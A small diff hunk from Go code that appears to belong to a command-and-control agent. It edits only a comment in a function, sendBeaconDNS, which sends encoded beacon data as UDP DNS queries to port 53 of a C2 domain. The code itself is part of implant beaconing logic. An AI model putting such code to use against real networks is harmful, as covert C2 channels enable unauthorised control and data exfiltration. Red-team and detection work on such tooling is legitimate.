@@ -28,7 +28,7 @@ func sendBeaconDNS(encoded []byte, c2Domain string) ([]byte, error) {
 	}
 
 	domain := strings.TrimSuffix(c2Domain, ".")
-	// Derive server address from domain — send queries to port 53 of the C2 domain.
+	// Derive server address from domain. Send queries to port 53 of the C2 domain.
 	serverAddr := net.JoinHostPort(domain, "53")
 
 	client := &mdns.Client{Net: "udp", Timeout: 5 * time.Second, UDPSize: agentDNSUDPSize}
